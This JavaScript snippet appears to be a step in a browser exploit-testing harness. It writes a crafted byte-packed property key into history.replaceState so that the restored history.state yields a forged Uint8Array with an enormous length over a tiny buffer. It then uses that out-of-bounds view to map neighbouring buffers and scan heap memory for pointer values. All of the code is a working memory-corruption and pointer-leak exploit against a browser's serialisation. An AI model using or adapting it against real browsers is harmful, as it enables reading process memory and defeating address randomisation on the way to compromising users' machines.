// Look for live pointer triples matching three measured backing-store spacings.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var size = 65536;
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  for (var a = 0; a < 3; a++) {
    var fixed = new ArrayBuffer(size);
    new Uint8Array(fixed).fill(0x91 + a);
    filler[2 + a] = fixed;
  }
  for (var n = 5; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var f = 27; f < filler.length; f++) filler[f] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("ptr_scan_stored");
  phase = "load";
  var output = history.state;
  mark("ptr_scan_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var clones = [new Uint8Array(output.filler[2]),
                new Uint8Array(output.filler[3]),
                new Uint8Array(output.filler[4])];
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
      synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
      target.byteLength === 8 && clones.every(function (view) {
        return view.length === size;
      });
  var firsts = [-1, -1, -1];
  var counts = [0, 0, 0];
  var mapped = false;
  var pointerWords = 0;
  var tripleCount = 0;
  var examples = [];
  if (valid) {
    phase = "map";
    var limit = 524288;
    var baseline = new Uint8Array(limit);
    for (var b = 0; b < limit; b++) baseline[b] = synthetic[b];
    for (var m = 0; m < 3; m++) {
      clones[m].fill(0xc4);
      for (var q = 0; q < limit; q++) {
        if (synthetic[q] !== baseline[q]) {
          if (firsts[m] < 0) firsts[m] = q;
          counts[m]++;
        }
      }
      clones[m].fill(0x91 + m);
    }
    mapped = firsts.every(function (index, i) {
      return index >= 0 && index + size <= limit && counts[i] === size &&
        synthetic[index] === 0x91 + i &&
        synthetic[index + size - 1] === 0x91 + i;
    }) && firsts[0] !== firsts[1] && firsts[0] !== firsts[2] &&
        firsts[1] !== firsts[2];
    if (mapped) {
      mark("ptr_scan_mapped");
      phase = "pointer_scan";
      var words = new Map();
      for (var off = 0; off + 7 < limit; off += 8) {
        var lo = (synthetic[off] | synthetic[off + 1] << 8 |
            synthetic[off + 2] << 16 | synthetic[off + 3] << 24) >>> 0;
        var hi = (synthetic[off + 4] | synthetic[off + 5] << 8 |
            synthetic[off + 6] << 16 | synthetic[off + 7] << 24) >>> 0;
        if (hi === 0 || hi > 65535 || lo % 8 !== 0) continue;
        var pointer = hi * 4294967296 + lo;
        pointerWords++;
        if (!words.has(pointer)) words.set(pointer, off);
      }
      var d1 = firsts[1] - firsts[0];
      var d2 = firsts[2] - firsts[0];
      words.forEach(function (offset, pointer) {
        if (!words.has(pointer + d1) || !words.has(pointer + d2)) return;
        tripleCount++;
        if (examples.length < 6) {
          var base = pointer - firsts[0];
          examples.push("0x" + base.toString(16) + "@" + offset + "/" +
              words.get(pointer + d1) + "/" + words.get(pointer + d2));
        }
      });
      mark("ptr_scan_done");
    }
  }
  result = { id: "backing_pointer_scan", status:
      valid && mapped ? "pass" : "fail", details: {
      view_valid: valid, mapped: mapped,
      first_indices: firsts.join(","), changed_counts: counts.join(","),
      pointer_words: pointerWords, distinct_pointers: mapped ? words.size : 0,
      matching_triples: tripleCount, examples: examples.join(";")
    } };
} catch (error) {
  result = { id: "backing_pointer_scan", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error =
    String(error).slice(0, 100); }
return [result];
